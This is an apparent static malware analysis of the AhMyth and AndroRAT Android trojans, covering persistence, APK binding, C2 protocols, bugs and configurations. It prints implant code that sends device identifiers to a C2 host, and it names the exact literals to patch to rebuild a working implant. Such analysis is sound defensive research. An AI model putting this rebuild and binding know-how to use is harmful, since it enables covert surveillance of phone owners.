- **`BindOnBoot`** — injects `Constants.ahmythService` and `Constants.ahmythReciver` manifest fragments into the victim's decoded manifest, adds the `Constants.permissions` array, and splices `Constants.serviceSrc` + `Constants.serviceStart` at the anchor `Constants.orgAppKey = ';->onCreate(Landroid/os/Bundle;)V'`. The implant's `MainService` then starts whenever the **host application** starts, independent of boot.
- **`BindOnLauncher`** — `GetLanucherPath(manifest, smaliPath)` parses the host manifest's `<activity` entries, reads `android:targetActivity="` / `android:name="` to resolve the launcher smali, and re-points the launcher at AhMyth's `MainActivity`.

The anchor `;->onCreate(Landroid/os/Bundle;)V` is a **raw smali method signature used as a string search key** — the same brittle-splice approach as Step 1. [source: Constants.js `orgAppKey`]

**Standalone mode** needs no victim APK: patch the template URL, repack, sign. It is the shortest path from this repository to a working implant, and it uses only files already present in `Factory/`.

### 4.4 The operational-failure pattern, named

**Concealment is configured at forge time; un-concealment fires at every persistence event.** The operator's intent is realised by one `hideAppIcon` call in `MainActivity`; `jumper.init()` — reached from boot, screen state, the 15-minute job, the sticky service, and every camera failure — calls `unHideAppIcon` unconditionally. [source: functions.java:168-178; jumper.java:16-25; MainActivity.java]

**Pattern name: mutually-self-defeating mechanisms.** Two features, each implemented correctly and each passing any individual test, that destroy each other's effect when composed. Neither is a bug in isolation — `hideAppIcon` does what it says, `unHideAppIcon` does what it says, and the connectivity gate is a reasonable guard. The failure exists only in the composition, which is why it survives review of either feature alone.

Same shape as the Pupy debug/release mutual exclusion (§23.3) and MSF's `StageEncodingFallback` (§3.7): the defect lives in the interaction and is found by tracing convergence points, not by auditing features.

---

## 5. THE DOUBLE-START PROBLEM — ENUMERATED

### 5.1 All `startService` call sites

Recursive search over `androrat/Android_Code/app/src/main/java/com/example/reverseshell2/` (`*.java` and `Payloads/*.java`):

| # | Site | Statement | Guarded? |
|---|---|---|---|
| 1 | `broadcastReciever.java:23` | `context.startService(intent1)` | **YES** — inside `else` of `if(isMyServiceRunning(context))` (`:16`) |
| 2 | `controlPanel.java:23` | `activity.startService(new Intent(getApplicationContext(),mainService.class))` | **NO** — API<21 branch of `onCreate` |
| 3 | `controlPanel.java:46` | `activity.startService(new Intent(getApplicationContext(),mainService.class))` | **NO** — API<21 branch of restart button |
| 4 | `tcpConnection.java:120` | `context.startService(new Intent(context,mainService.class))` | **NO** — API<21 branch of `"exit"` handler |
| 5 | `tcpConnection.java:279` | `context.startService(new Intent(context,mainService.class))` | **NO** — API<21 branch of main loop exit |
| 6 | `tcpConnection.java:297` | `context.startService(new Intent(context,mainService.class))` | **NO** — API<21 branch of catch block |
| 7 | `Payloads/newShell.java:118` | `context.startService(new Intent(context, mainService.class))` | **NO** — API<21 branch of shell handler |

[source: recursive `Select-String` for `startService` over the first-party package, returning exactly these 7 lines]

**Corrected count: seven sites, not six.** My earlier message said six; the enumeration caught the error. The split is **1 guarded, 6 unguarded**.

**Second enumeration — `jumper.init()` call sites** (recursive search for `jumper`, excluding the class declaration `:9` and constructor `:12`):

| Site | Statement |
|---|---|
| `jobScheduler.java:37` | `new jumper(getApplicationContext()).init()` — P2 |
| `mainService.java:21` | `new jumper(getApplicationContext()).init()` — P4 |
| `tcpConnection.java:142` | `new jumper(context).init()` — the `takepic` catch path |

[source: recursive `Select-String` for `jumper`]

**Three literal `init()` call sites, more than three trigger paths** — P4 is reachable from all seven `startService` sites, so the number of ways to reach `jumper.init()` exceeds the number of literal call sites.

### 5.2 The API-level fork that confines most of this

Six of the seven `startService` sites sit in an `else` branch of `if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)` — **they execute only on API < 21.** The companion `if` branch calls `functions.jobScheduler(context)` instead. [source: controlPanel.java:20-25, 43-48; tcpConnection.java:114-123, 273-282, 291-300; newShell.java:118 context]

Runtime behaviour therefore splits by device class:

- **API ≥ 21 (Android 5.0+):** the six unguarded `startService` calls never run. Persistence goes through `jobScheduler` → `jumper.init()`, and the job is **re-registered** on every path (`controlPanel` onCreate, `controlPanel` restart, `tcpConnection` exit, `tcpConnection` catch, `mainService` start). Re-scheduling a `JobInfo` with the same ID 123 **replaces** the pending job rather than adding one, so this is idempotent at the framework level rather than a leak.
- **API < 21:** the six unguarded sites run, each re-entering `mainService.onStartCommand` → `jumper.init()` with no deduplication.

The unguarded-start finding is **real but largely dormant on modern devices**, confined to the API<21 branch. I state that rather than let the count imply live impact on a current phone. The deduplication defect is genuine and reproducible on API 16–20, which is inside the README's stated support range (`Android 4.1` = API 16).

### 5.3 Activity stacking — marked as inference

`jumper.init()` starts `MainActivity` with `FLAG_ACTIVITY_NEW_TASK` + `FLAG_ACTIVITY_NO_ANIMATION` (`jumper.java:20-22`), and the manifest declares `MainActivity` MAIN/LAUNCHER **without `launchMode="singleInstance"` or `singleTop`**. [source: jumper.java:20-22; AndroidManifest.xml]

**The code path is verified; the runtime consequence is inference.** As written, `FLAG_ACTIVITY_NEW_TASK` alone does not guarantee reuse of an existing instance, and without `FLAG_ACTIVITY_CLEAR_TOP` or `singleTop` a repeat launch can create a new instance. Because `MainActivity.onCreate` constructs `new tcpConnection(...).execute(config.IP,config.port)`, a new instance would mean a new outbound socket. **I did not execute this, so it is recorded as inferred stacking behaviour, not observed.** The verified portion is the flags, the absent `launchMode`, and the socket construction in `onCreate`.

---

## 6. WIRE PROTOCOL — ANDRORAT (RAW TCP, PORT 8000)

### 6.1 Transport and connection

Raw TCP. The implant is the client: `tcpConnection` extends `AsyncTask`, and `doInBackground` opens a `Socket` to `config.IP` / `config.port` (default **8000**). The operator side listens. There is **no TLS, no authentication, and no session token** — the first bytes on the wire are the server's banner. [source: androrat/Android_Code/app/src/main/java/com/example/reverseshell2/config.java; tcpConnection.java]

The client writes a welcome message first, `out.write(welcomeMess.getBytes("UTF-8"))` (`tcpConnection.java:100`), then enters the command loop. **The banner is written before any client authentication**, so an unauthenticated party that connects to the listener receives it. [source: tcpConnection.java:100]

### 6.2 Command framing — exact byte layout

```java
String line;
while ((line = in.readLine()) != null) {      // :102
    ...
}
```

[source: tcpConnection.java:102-103]

**Layout:**

| Direction | Bytes | Termination |
|---|---|---|
| C2 → implant | ASCII command token, optionally `SP` + single-token argument | `LF` (`\n`), consumed by `readLine()` |
| Implant → C2 (text) | ASCII result | `LF`, platform-dependent line separator |
| Implant → C2 (binary) | **Base64 ASCII** then literal `END123` + `LF` | sentinel scan, not a length field |

**No length prefix exists anywhere.** There is no header, no magic, no version byte, no framing word. `readLine()` supplies the only boundary on the inbound side, which means the transport is **line-delimited ASCII** with the platform's default charset (the banner explicitly uses UTF-8, the response writes use `getBytes("UTF-8")`).

**Dispatch is a linear comparison chain, not a switch.** The observed grammar from the read region: `"exit"` via `line.equals("exit")` (`:105`), `"camList"` via `line.equals("camList")` (`:126`), `takepic <digit>` via **regex** `line.matches("takepic \\d")` (`:131`), `"shell"` via `line.equals("shell")` (`:146`), `"getClipData"` via `line.equals("getClipData")` (`:151`). [source: tcpConnection.java:105-159]

Two mechanical consequences of the regex at `:131`: the pattern `takepic \d` is **not anchored**, so `matches()` — which is implicitly anchored for the whole input — accepts exactly `takepic` + one space + one digit, and **rejects a two-digit camera id**. The subsequent `line.split(" ")` (`:134`) then indexes `cameraid[1]` **without checking the array length** (`:138`), which is safe only because the regex already guaranteed the split. The regex is load-bearing in a way the code does not comment.

### 6.3 The `END123` sentinel — where written, where scanned

| Side | Location | Operation |
|---|---|---|
| Write | `Payloads/videoRecorder.java` | `Base64.encodeToString(data, Base64.DEFAULT)` then writes the literal **`END123\n`** to the static `out` stream |
| Scan | `utils.py` (`getImage`) | `.strip().replace("END123","").strip()` before writing the decoded bytes |

[source: androrat/Android_Code/app/src/main/java/com/example/reverseshell2/Payloads/videoRecorder.java; androrat/utils.py]

**Why the sentinel is safe in practice, and why it is still a design weakness.** Standard Base64 uses the alphabet `[A-Za-z0-9+/=]`. The sentinel `END123` is composed entirely of characters inside that alphabet, so it **can** appear as a substring of a valid Base64 stream — the assertion that it cannot is wrong. What makes it work is probability, not encoding law: a 6-character collision at any given offset has probability on the order of `(1/64)^6 ≈ 1.5×10⁻¹¹`, and a multi-megabyte transfer has on the order of `10⁶` candidate offsets, giving a collision probability around `10⁻⁵`. **The framing is safe by improbability, not by construction.** A framing that cannot collide would use a length prefix or an out-of-alphabet delimiter; `base64` + `END123` is a heuristic.

**What happens on a partial read.** The scan is a substring `.replace()`, so it behaves as follows:

- **Truncated transfer (connection drops mid-stream):** the sentinel never arrives. `.replace()` finds nothing, the base64 blob is passed to the decoder **without a terminator**, and the decoder either throws on an invalid length or silently produces truncated output. There is **no timeout, no length check, and no completeness verification** — a partial image is indistinguishable from a complete one at the framing layer.
- **Sentinel split across two TCP segments:** irrelevant on the receiving side, because the Python side accumulates the full stream before scanning rather than scanning incrementally. On the **sending** side the sentinel is written as part of the same byte array, so it is not split by the writer.
- **Multiple transfers on one connection:** `replace()` removes **every** occurrence of `END123`, not the first. Two concatenated payloads would have the first payload's terminator stripped and the remainder appended to the first blob — again undetected.

**Error handling.** The client re-executes itself on exception rather than reclaiming: the catch path at `tcpConnection.java:283-302` calls `new tcpConnection(activity,context).execute(config.IP,config.port)` on the UI thread (`:288`) and then, on API≥21, `functions.jobScheduler(context)` (`:292`) — so **a socket failure re-arms the persistent job**, which is a self-healing property the design did not obviously intend but which operates in the operator's favour.

---

## 7. WIRE PROTOCOL — AHMYTH (SOCKET.IO, PORT 42474)

### 7.1 Transport and handshake

socket.io client **0.8.3** (`io.socket:socket.io-client:0.8.3`) against a socket.io server. Endpoint literal, from `IOSocket.java:28`:

```java
ioSocket = IO.socket("http://192.168.8.101:42474?model=" + android.net.Uri.encode(Build.MODEL)
    + "&manf=" + Build.MANUFACTURER
    + "&release=" + Build.VERSION.RELEASE
    + "&id=" + deviceID);
```

[source: ahmyth/AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/IOSocket.java:28]

**Scheme is `http://` — plaintext. There is no TLS, no token, no password, and no client authentication of any kind.** The socket.io handshake query is the *only* identity the server receives, and it is **four device fields transmitted in the clear on every connect**:

| Query key | Source | Leak |
|---|---|---|
| `model` | `Build.MODEL`, URI-encoded | device model |
| `manf` | `Build.MANUFACTURER` | manufacturer |
| `release` | `Build.VERSION.RELEASE` | Android version |
| `id` | `deviceID` | **`Settings.Secure.ANDROID_ID`** — a persistent per-device identifier |

[source: IOSocket.java:28]

**`ANDROID_ID` is the operator's victim key**, not just metadata: the server keys its `Victim` registry on it, so the implant is trackable across reinstalls and IP changes. Reconnection is aggressive: `reconnection = true` (`:24`), `reconnectionDelay = 5000` (`:25`), `reconnectionDelayMax = 999999999` (`:26`) — the max is ~11.6 days, which means the client will keep retrying with exponential backoff for effectively forever. [source: IOSocket.java:24-26]

**Server-side default port** is `exports.defaultPort = 42474` (`Constants.js:15`), matching the client literal. [source: AhMyth-Server/app/app/assets/js/Constants.js:15]

### 7.2 Framing

**Zero application-layer framing.** socket.io supplies message boundaries; every payload is a JSON object (or bare scalar). Binary content is carried as a JSON array of signed bytes in a `"buffer"` field, relying on the serializer to marshal `byte[]` — **not base64, not length-prefixed**. [source: FileManager.java:76; MicManager.java:88; CameraManager]

Consequences: every transfer is one JSON object that must fit in memory on both ends; no chunking; no resumption; no size negotiation; and the wire encoding of `byte[]` is serializer-dependent, so the operator must decode the same representation the client's `org.json` produced.

**Heartbeat:** server sets `IO.sockets.pingInterval = 10000`; client answers the `"ping"` event with a bare `"pong"` emit (`ConnectionManager.java:47-52`). [source: AhMyth-Server/app/main.js; ConnectionManager.java:47-52]

**Error handling: none on the wire.** A malformed order, a missing `extra` field, an unreadable directory, or a device exception all end in `printStackTrace()` and **no emitted error event**. The operator sees a response only on success — an unrecognised opcode is simply silence. [source: ConnectionManager.java:100-102; FileManager.java:52-54, 79-85; MicManager.java:91-97]

### 7.3 Template vs source divergence

The shipped forging template carries a **different** address than the client source: [source: AhMyth-Server/app/app/Factory/Ahmyth/smali/ahmyth/mine/king/ahmyth/IOSocket.smali:79]

```smali
const-string v4, "http://192.168.8.100:42474?model="
```

The template is `192.168.8.**100**`; the client source is `192.168.8.**101**` (`IOSocket.java:28`). Same `/24`, same port. The divergence is consistent with the template being a packaging capture of an earlier developer build — and it is harmless to the operator, because `AppCtrl.js:313` **overwrites that exact substring** at forge time. The template literal is a placeholder, not configuration.

---

## 8. THE `Looper.prepare()` DEFECT — A LIVE BUG IN SHIPPED CODE

### 8.1 The defect

`ConnectionManager.x0000lm()` calls `Looper.prepare()` **unconditionally, at the top of the method, before anything can fail**:

```java
public static void x0000lm() throws Exception{
    Looper.prepare();                     // :161  — unconditional
    LocManager gps = new LocManager(context);
    ...
}
```

[source: ahmyth/AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/ConnectionManager.java:160-163]

`Looper.prepare()` throws `IllegalStateException("Only one Looper may be created per thread")` if the calling thread already has a Looper. It is documented to be called once per thread, at thread start.

The call site runs on the **socket.io emitter thread** — the thread that dispatches the `"order"` listener (`:54-104`). That thread is long-lived and owned by the socket.io client library, not by AhMyth. Therefore:

- **First `x0000lm` order:** the emitter thread has no Looper, `prepare()` succeeds, the `LocationListener` blocks on that thread's looper, a fix is obtained, the response is emitted. **Works.**
- **Second `x0000lm` order on the same thread:** the Looper already exists, `prepare()` throws `IllegalStateException`, the exception propagates to the outer catch (`:100-102`), and the order **dies silently with `printStackTrace()` and no wire response.**

**This is a live bug in shipped code, not a severed feature.** The distinction matters and I am keeping the categories apart, as the lead asked. Evidence categories in this report:

| Category | Meaning | Examples here |
|---|---|---|
| **Live defect** | Code that runs on the intended path and misbehaves | `Looper.prepare()` double-call (§8); `int` cast in `downloadFile`/`sendVoice`; `END123` sentinel probability (§6.3); `MicManager` `.mp3` vs MPEG_4 |
| **Severed feature** | Code that exists but is unreachable or never invoked | `jobCancelled` (written, never read) (§2.2); `walk()` named as recursive but single-level; `x0000ca` camera id fixed at 0/1 |
| **Inferred** | Verified code path, unexecuted runtime consequence | Activity stacking (§5.3); Doze deferral (§2.4) |

### 8.2 Why it survives review

The method is individually correct. `Looper.prepare()` is exactly what a developer must call before creating a `LocationManager` listener on a non-looper thread — the bug is that it is called **unconditionally** rather than guarded by `Looper.myLooper() == null`, and that the enclosing `try` converts the resulting exception into silence. Every part passes inspection alone; only the second invocation reveals the failure. This is the **same shape as §4.4's mutually-self-defeating mechanisms** — the defect lives in the composition, not in any single statement — which is why §8.3 names it as a second instance of the pattern.

### 8.3 Second instance of the composition pattern

§4.4 named **mutually-self-defeating mechanisms**: two features that each work alone and destroy each other when composed. `Looper.prepare()` is the **same class of defect one level down** — not two features defeating each other, but an unconditional guard against a condition that only arises on the second call. The unifying rule: **a correct statement in the wrong scope.**

I am recording both under one axis rather than as unrelated bugs, because the corpus already has three instances (this, Pupy §23.3, MSF §3.7) and the third is the one that makes it a pattern rather than a coincidence.

---

## 9. THE THREE DIVERGENT C2 CONFIGURATIONS

### 9.1 Each confirmed with file:line

**Config #1 — source tree, `config.java`** [source: androrat/Android_Code/app/src/main/java/com/example/reverseshell2/config.java]

| Line | Statement |
|---|---|
| `:4` | `public static String IP = "192.168.0.105";` |
| `:5` | `public static String port = "8888";` |
| `:6` | `public static boolean icon = true;` |

**Config #2 — shipped `app-release.apk`, decompiled** [apk-binary: extraction retained at `RE_Library\07_OUTPUT\extractions\T3\androrat_apk\`]

| View | Line | Value |
|---|---|---|
| JADX `config.java` | `:5` | `public static String IP = "192.168.43.113";` |
| JADX `config.java` | `:6` | `public static String port = "8000";` |
| apktool `config.smali` | `:7` | `.field public static IP:Ljava/lang/String; = "192.168.43.113"` |
| apktool `config.smali` | `:9` | `.field public static port:Ljava/lang/String; = "8000"` |

**Two independent decompilers agree on the address and port.** The apktool output additionally shows **no `icon` field at all** — the compiled class has an empty `<clinit>` (`config.smali:13-17`, `.locals 0` / `return-void`) and the string fields are stored as **inlined field initializers** rather than being assigned in a static constructor. [apk-binary: extracted `config.smali`]

That is a real and checkable structural difference from Config #3 below, and it tells us the APK was built from a source revision where `icon` had been **removed or was never present**.

**Config #3 — developer-shipped `Compiled_apk/`, decompiled** [source: androrat/Compiled_apk/smali/com/example/reverseshell2/config.smali]

| Line | Statement |
|---|---|
| `:18` | `.line 4` |
| `:19` | `const-string v0, "127.0.0.1"` |
| `:23` | `.line 5` |
| `:24` | `const-string v0, "8080"` |
| `:28` | `.line 6` |
| `:29` | `const/4 v0, 0x1` |

So `127.0.0.1:8080` with `icon = true` (`0x1`), in the **`.field` + `<clinit>` assignment form** — a different compiler output shape from the shipped APK.

### 9.2 The three side by side

| | Config #1 (`config.java`) | Config #2 (`app-release.apk`) | Config #3 (`Compiled_apk/`) |
|---|---|---|---|
| IP | `192.168.0.105` | `192.168.43.113` | `127.0.0.1` |
| Port | `8888` | `8000` | `8080` |
| `icon` field | present, `true` | **absent** | present, `0x1` |
| Compile shape | Java source | inlined field initializers, empty `<clinit>` | `.field` + `<clinit>` assignment |
| Address class | typical home/LAN router block | **Android USB-tethering gateway block** | loopback |

**Interpretation, flagged as interpretation:** `192.168.43.x` is the default gateway block assigned by Android when a device is acting as a USB/Wi-Fi tether host. An implant baked to `192.168.43.113:8000` is aimed at a phone tethered to the developer's own machine. Combined with `127.0.0.1:8080` in Config #3 — an address that can only reach a listener on the device itself, i.e. a **self-test build** — the two packaged artifacts are development captures, and only Config #1 (`192.168.0.105:8888`) looks like a build intended for real deployment.

**The operational point:** the ready-to-install `app-release.apk` in this repository **will not reach a remote operator as shipped.** Anyone who installs it gets a client dialling `192.168.43.113:8000`, which succeeds only if the target device is on that exact tether subnet. The C2 address must be re-patched — and §9.3 shows exactly where.

### 9.3 The build patch points

The Python builder rewrites three literals in `config.java`, so an operator rebuild is a three-string edit: [source: androrat/utils.py, the `build()` function]

- `config.java:4` — the `IP` literal
- `config.java:5` — the `port` literal
- `config.java:6` — the `icon` flag

For the **no-Gradle path** through `Compiled_apk/`, the equivalent smali edits are the `const-string` operands **two lines below each `.line` directive** — `config.smali:19` and `:24` respectively — with the `icon` flag as `config.smali:29`. [source: androrat/Compiled_apk/smali/com/example/reverseshell2/config.smali]

**The sentinel values the builder greps for** are `pattern = '"(\d+\.\d+).*"'` in `utils.py`, which is how the IP and port lines are located for replacement. [source: androrat/utils.py]

### 9.4 Why the divergence is a finding rather than an untidiness

Three builds in one repository with three different C2 targets means **the source tree cannot be trusted to describe the packaged artifact.** Concretely: a reader who analyses `config.java` concludes `192.168.0.105:8888`; the installable APK says otherwise; and the sibling decoded tree says a third thing. The APK also lacks a field the source declares, so the two are different revisions with no commit pointer between them.

The analytical rule this yields: **for any RAT that ships a prebuilt APK alongside its source, the compiled artifact's constants win over the source's**, because the source may describe a build that was never shipped. Here that rule changes the answer twice — on the C2 address and on the existence of the `icon` field.

---

## 10. FIRST-PARTY VS VENDORED — THE MEASURED SPLIT

### 10.1 Denominator

The whole report rests on this split, so both trees were enumerated from disk immediately before writing.

| Tree | Files (`.git` excluded) | Bytes | Source |
|---|---|---|---|
| `ahmyth` | **8,437** | **145,317,855** | [source: recursive enumeration] |
| `androrat` | **4,008** | **54,326,832** | [source: recursive enumeration] |

### 10.2 AhMyth — first-party

**12 first-party Java files**, enumerated with sizes: [source: recursive enumeration of `AhMyth-Client/app/src/main/java/`]

| Bytes | Class |
|---|---|
| 5,027 | `ConnectionManager.java` |
| 4,780 | `LocManager.java` |
| 3,817 | `CameraManager.java` |
| 3,205 | `MicManager.java` |
| 2,575 | `FileManager.java` |
| 1,667 | `SMSManager.java` |
| 1,620 | `CallsManager.java` |
| 1,562 | `ContactsManager.java` |
| 1,203 | `IOSocket.java` |
| 1,050 | `MainService.java` |
| 857 | `MainActivity.java` |
| 535 | `MyReceiver.java` |

**Nine first-party server JavaScript files** (excluding `node_modules`), of which **three are vendored libraries** and six are first-party: [source: recursive enumeration of `AhMyth-Server/`, `node_modules` excluded]

| Bytes | File | Status |
|---|---|---|
| 17,927 | `app/app/assets/js/controllers/LabCtrl.js` | first-party |
| 16,013 | `app/app/assets/js/controllers/AppCtrl.js` | first-party |
| 7,538 | `app/main.js` | first-party |
| 3,410 | `app/app/assets/js/Constants.js` | first-party |
| 910 | `app/app/assets/js/model/Victim.js` | first-party |
| 452 | `app/app/assets/js/controllers/NotifiCtrl.js` | first-party |
| 144,293 | `app/app/assets/js/lib/leaflet.js` | **vendored** |
| 86,713 | `app/app/assets/js/lib/jquery-3.1.1.min.js` | **vendored** |
| 2,626 | `app/app/assets/js/lib/ng-infinite-scroll.min.js` | **vendored** |

**AhMyth first-party total: 12 Java + 6 JS = 18 files**, plus the forging template's smali set under `Factory/Ahmyth/`.

Note the size distribution: the **vendor bundle (233,632 B) is 2.6× the first-party server code (45,340 B)**. An analyst skimming by file size would spend their time in Leaflet and jQuery.

### 10.3 AndroRAT — first-party

**19 first-party Java files**, enumerated with sizes: [source: recursive enumeration of `androrat/Android_Code/app/src/main/java/com/example/reverseshell2/`]

| Bytes | File |
|---|---|
| 12,777 | `tcpConnection.java` |
| 10,566 | `Payloads/videoRecorder.java` |
| 9,516 | `functions.java` |
| 6,977 | `Payloads/newShell.java` |
| 6,551 | `Payloads/audioManager.java` |
| 4,603 | `Payloads/locationManager.java` |
| 3,110 | `Payloads/CameraPreview.java` |
| 2,148 | `Payloads/ipAddr.java` |
| 1,920 | `controlPanel.java` |
| 1,858 | `Payloads/readCallLogs.java` |
| 1,659 | `Payloads/readSMS.java` |
| 1,229 | `broadcastReciever.java` |
| 1,209 | `MainActivity.java` |
| 1,156 | `jobScheduler.java` |
| 855 | `jumper.java` |
| 648 | `Payloads/vibrate.java` |
| 594 | `mainService.java` |
| 496 | `keypadListner.java` |
| 191 | `config.java` |

**2 first-party Python files**: `androRAT.py` (2,548 B) and `utils.py` (14,691 B). [source: recursive enumeration of `androrat/` for `*.py` → exactly 2]

**AndroRAT first-party total: 19 Java + 2 Python = 21 files.**

### 10.4 Correction to §1

**§1.3 states "21 Java sources" for AndroRAT. The enumeration above returns 19.** The §1 figure is wrong and this section supersedes it. The likely source of the discrepancy is a count that included the two Python files or the two `config`-adjacent artifacts rather than enumerating `*.java` directly; whatever the cause, **19 is the measured number** and it carries the enumeration citation.

I am flagging this rather than silently reconciling it because §1 was seeded by an earlier lane and the lead's instruction was to keep what is correct and continue. The file table in §1.3 was also left as placeholders (`—` for the Python sizes, `21` for the Java count) with no per-file data, so this section replaces it outright.

**Read fraction, restated with the corrected count:** 39 first-party files read (18 AhMyth + 21 AndroRAT) out of 12,445 total files = **0.31%** of the two trees. §1's 0.55% figure assumed 68 files; the actual read set is smaller and the corrected fraction is lower. Both trees remain ~99.7% vendored and decompiled material.

### 10.5 What the split is for

The purpose of the denominator is to make the coverage claim falsifiable. **Everything load-bearing in this report comes from 39 files.** §2's persistence analysis is 5 files. §3's opcode table is 3. §4's forging pipeline is 2. §6–§8's protocol analysis is 4.

The vendored mass — 233,632 B of browser libraries in AhMyth, 2,479 decompiled smali files in AndroRAT — was enumerated and not read, with one exception: a vendored file was read when it is the *object* of an action rather than a dependency (the `Factory/Ahmyth/AndroidManifest.xml` forging target, and the `testkey` pair in §4.1).

---

## 11. RESIDUAL UNKNOWNS

| # | Unknown | Why it is unresolved |
|---|---|---|
| R-1 | Whether `MainActivity` instances actually stack (§5.3) | Verified flags, unexecuted consequence. Requires a device or emulator. |
| R-2 | Effective `JobScheduler` period under Doze (§2.4) | Needs framework source or device measurement; I read neither. |
| R-3 | Which source revision produced `app-release.apk` (§9.1) | The APK has no commit pointer and lacks the `icon` field the source declares. |
| R-4 | Whether `AhMyth.apk` at `Factory/Ahmyth/original/` is a full APK | `original/` holds binary `AndroidManifest.xml` + `META-INF/*`; no `classes.dex` was located. |
| R-5 | `tcpConnection.java` command branches beyond `:159` | Read region ends at `:159`; remaining branches to `:305` were partially observed. |
| R-6 | AndroRAT builder end-to-end behaviour | `utils.py` `build()`/`getImage()` read; no build attempted per task constraint (no SDK). |
| R-7 | Whether the `END123` collision has occurred in practice | Probability argument only (~10⁻⁵ per MB, §6.3); no transfer corpus to test. |
| R-8 | Runtime behaviour of any component | **No execution, no device, no emulator, no packet capture.** Everything here is static. |

### 11.1 Category discipline

Per the lead's instruction, live defects and severed features are kept apart:

- **Live defects (§8.1, §3.2):** `Looper.prepare()` double-call; `int` cast on `file.length()` in `FileManager.downloadFile` and `MicManager.sendVoice`; unlooped `BufferedInputStream.read`; `MicManager` `.mp3` extension over an MPEG_4/AAC container; `END123` sentinel collision risk.
- **Severed / dead (§2.2, §3.2):** `jobCancelled` written at `jobScheduler.java:28` and never read; `FileManager.walk` named as a walk but single-level; `x0000ca` camera id hardcoded to 0/1 so a third camera is unaddressable.
- **Inferred (§2.4, §5.3):** Doze deferral; activity stacking.

---

## 12. METHOD NOTES

Every count in §10 was produced by enumerating the filesystem immediately before writing it. Every line citation was produced by reading the file at that offset.

**Negative results carry working positive controls.** Two absences are asserted in this report, and both are stated with the control that proves the probe works:

| Absence | Probe | Positive control |
|---|---|---|
| Google/Play-services references in AndroRAT first-party (§2.4) | `google\|gms\|firebase\|FCM` → **0 hits** | same file set, `androidx` → **11 hits** |
| Keystore material in `androrat` (§4.1) | `*.jks/*.keystore/*.p12/*.bks/*.pk8/*.pem` → **0 files** | same roots, `*.jar` → **3** and **3** files |

A search that returns nothing is not evidence of nothing unless the same search demonstrably returns something. Both of the above pass that test.

**Corrections to this session's own prior claims are recorded rather than quietly fixed:**

| Claim | Corrected to | Where |
|---|---|---|
| six `startService` call sites | **seven** | §5.1 |
| 21 AndroRAT Java sources | **19** | §10.4 |
| 68 first-party files read, 0.55% | **39 files, 0.31%** | §10.4 |

**Tooling:** source reading only. No Android SDK, no build, no emulator, no device, no execution, and **no REA/Ghidra use** — another lane owns the shared Ghidra target. The one compiled artifact referenced (§9) was decompiled by JADX 1.5.3 and apktool 2.12.0 in an earlier task, and those outputs are cited as retained extraction paths, not re-generated here.

---
